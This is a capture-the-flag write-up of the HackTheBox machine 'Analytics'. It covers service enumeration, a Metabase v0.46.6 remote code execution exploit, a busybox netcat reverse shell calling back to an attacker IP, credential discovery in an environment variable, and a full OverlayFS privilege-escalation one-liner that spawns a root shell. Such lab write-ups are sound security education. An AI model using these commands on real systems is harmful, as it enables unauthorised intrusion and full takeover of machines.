## Hello everyone!

Today, we will explore “*Analytics*”, an easy machine from HackTheBox.

Without further ado, let’s get started!



![image](/HTB/Analytics/Analytics_images/1.png)



(ensure that you added the following line `TARGET_IP    analytics.htb` to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:



![image](/HTB/Analytics/Analytics_images/2.png)



We can identify two running services:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (nginx 1.18.0 (Ubuntu) | 80)

We can inspect the website hosted on port **80** to see what it contains:



![image](/HTB/Analytics/Analytics_images/3.png)



It seems that we need to add another domain name into our `/etc/hosts` file.

We need to add the `analytical.htb` domain in order to access it:



![image](/HTB/Analytics/Analytics_images/4.png)



We now should be able to visit the website:



![image](/HTB/Analytics/Analytics_images/5.png)



Indeed, we can. It seems that the website has a login panel (in the right-hand corner), let’s try to access it:



![image](/HTB/Analytics/Analytics_images/6.png)



It seems that the portal is hosted on a subdomain. We need to add `data.analytical.htb` to the `/etc/hosts` file again in order to resolve it:



![image](/HTB/Analytics/Analytics_images/7.png)

![image](/HTB/Analytics/Analytics_images/8.png)



We discovered a new application named **Metabase** which handles a login panel. Looking at the source code reveals us the Metabase version:



![image](/HTB/Analytics/Analytics_images/9.png)



## Initial Access

We now know that Metabase is running under **v0.46.6.** We can use `searchsploit` to retrieve a potential exploit associated to these information:



![image](/HTB/Analytics/Analytics_images/10.png)



It looks like we can use a Python script to achieve a **remote code execution** (RCE) in order to obtain our initial access. We can execute it with the `-h` switch to obtain additional information



![image](/HTB/Analytics/Analytics_images/11.png)



As we can see, we need to provide our local IP, listening port for catching the reverse shell, the remote port and URL to the script.



![image](/HTB/Analytics/Analytics_images/12.png)



The exploit executed successfully and we obtained a reverse shell. But our environment seems limited. We can attempt to upgrade it via another reverse shell. We will run `busybox nc LOCAL_IP NC_PORT -e sh` alongside of our **netcat listener** we set up before using `nc -lvnp PORT`:



![image](/HTB/Analytics/Analytics_images/13.png)



We can now use a faster shell but it is still very limited: we were unable to use commands such as `sudo -l` or `find`. However, listing the environment variable with `env` reveals us something very interesting:



![image](/HTB/Analytics/Analytics_images/14.png)



We discovered a plaintext password in the `META_PASS` variable! Can we use it to log in as the provided user which is **metalytics**?



![image](/HTB/Analytics/Analytics_images/15.png)



Indeed, we can!

We are now able to retrieve the first flag in our current directory:



![image](/HTB/Analytics/Analytics_images/16.png)



## Privilege Escalation

We need to elevate our privileges in order to retrieve the root flag. We can start our local enumeration for privilege escalation paths using `sudo -l` since we know the password for **metalytic**. This may allow us to check whether we can run privileged commands:



![image](/HTB/Analytics/Analytics_images/17.png)



It seems that we can’t. 

Checking cron jobs, capabilities, and SUID binaries did not reveal anything useful for our privilege escalation. Since no other users were identified, horizontal privilege escalation was not a viable path. We need to find a way to **root** directly.

After performing local enumeration about kernel version and ubuntu release, we can identify that the target has a vulnerability into the OverlayFS component.

OverlayFS is a layered file system directly implemented in the Linux kernel. It allows to overlay multiple directories to present them as an unique file system. It has multiple vulnerabilities allowing the attacker to perform **local privilege escalation** (LPE).

We can use the following payload exploit this vulnerability:

`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;` spawn a shell into an isolated environment `setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` Give to the Python binarie the `cap_setuid` capability which allow to change the **UID**. Basically, Python is allowed to be executed as a different user. Meanwhile, it create a merged file system. After all has been setup, the final `python3` command spawn a Bash shell with the **UID set to 0**, which correspond to **root**. It allows us to spawn a **root shel**l since the command is executed with an elevated UID:

The final payload is:

`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`



![image](/HTB/Analytics/Analytics_images/18.png)



We successfully elevated our privileges to **root**! The OverlayFS vulnerability allowed us to impersonate the User ID in order to receive root privileges. We can now navigate in the `/root` directory and retrieve the last flag:



![image](/HTB/Analytics/Analytics_images/19.png)



Challenge completed!



![image](/HTB/Analytics/Analytics_images/20.png)



## Conclusion

In this machine, we started by enumerating the exposed services and quickly identified a web application running **Metabase** on a subdomain. By carefully inspecting the application version, we were able to identify a known vulnerability affecting **Metabase v0.46.6**, which led to our initial foothold through remote code execution.

Once inside the system, we improved our shell and performed local enumeration. A sensitive environment variable containing credentials allowed us to pivot to the user **metalytics**, giving us access to the first flag.

For privilege escalation, traditional vectors such as `sudo`, SUID binaries, and cron jobs did not yield any results. However, deeper system inspection revealed a vulnerable kernel configuration involving **OverlayFS**, a layered filesystem implemented in the Linux kernel.

By abusing this weakness in a controlled exploit chain involving user namespaces, capabilities, and OverlayFS mount manipulation, we were able to escalate privileges and obtain a root shell.

This machine highlights several important real-world security lessons:

- Always verify exposed application versions, as they may reveal critical vulnerabilities
- Never expose sensitive credentials in environment variables
- Local enumeration remains essential when initial privilege escalation paths fail
- Kernel-level misconfigurations and vulnerabilities can often be the final escalation vector

Ultimately, this box demonstrates a full attack chain: from **web exploitation → credential discovery → privilege escalation → kernel abuse**, reflecting a realistic penetration testing scenario.


**Thank you for reading!**
